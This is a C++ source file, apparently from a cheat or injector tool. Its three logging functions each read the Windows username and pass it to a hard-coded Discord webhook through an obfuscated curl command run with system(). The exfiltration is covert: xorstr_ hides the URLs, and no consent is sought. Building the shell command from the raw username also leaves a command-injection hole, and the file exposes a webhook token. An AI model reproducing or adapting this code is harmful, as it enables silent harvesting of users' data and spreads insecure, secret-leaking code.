#include <WinBase.h>
#include <string>
#include <lmcons.h>
#include "../helpers/xorstr.hpp"

using namespace std;

void start_log() {
	char name[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(name, &username_len);
	string webhook_url = xorstr_("https://discord.com/api/webhooks/1016685372568260638/15iGD8Z8UhfSLpAfPz94ysp9xv3QsCkY3OQXAXEa64kJImu7BkhLdZGj-N4IgcvmedxX");
	string avatar_url = xorstr_("https://cdn.discordapp.com/icons/713763610488340560/1da746b68f4ae5d84f958f3ce1e6a375.png?size=1024");
	string winname = name;
	string ip_url = xorstr_("http://myexternalip.com/raw");
    string success = xorstr_("curl --data \"username= start logs&content=start: ")  + winname + xorstr_("&avatar_url=") + avatar_url + "\" " + webhook_url;
	system(success.c_str());
}

void injection_log() {
	char name[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(name, &username_len);
	string webhook_url = xorstr_("https://discord.com/api/webhooks/1016685372568260638/15iGD8Z8UhfSLpAfPz94ysp9xv3QsCkY3OQXAXEa64kJImu7BkhLdZGj-N4IgcvmedxX");
	string avatar_url = xorstr_("https://cdn.discordapp.com/icons/713763610488340560/1da746b68f4ae5d84f958f3ce1e6a375.png?size=1024");
	string ip_url = xorstr_("https://myexternalip.com/raw");
	string winname = name;
	string success = xorstr_("curl --data \"username= injection logs&content=injection: ") + winname + xorstr_("&ip_url") + ip_url + xorstr_("&avatar_url=") + avatar_url + "\" " + webhook_url;
	system(success.c_str());
}

void debug_log() {
	char name[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(name, &username_len);
	string webhook_url = xorstr_("https://discord.com/api/webhooks/1016685372568260638/15iGD8Z8UhfSLpAfPz94ysp9xv3QsCkY3OQXAXEa64kJImu7BkhLdZGj-N4IgcvmedxX");
	string avatar_url = xorstr_("https://cdn.discordapp.com/icons/713763610488340560/1da746b68f4ae5d84f958f3ce1e6a375.png?size=1024");
	string winname = name;
	string success = xorstr_("curl --data \"username= debug logs&content=debuding: ") + winname + xorstr_("&avatar_url=") + avatar_url + "\" " + webhook_url;
	system(success.c_str());
}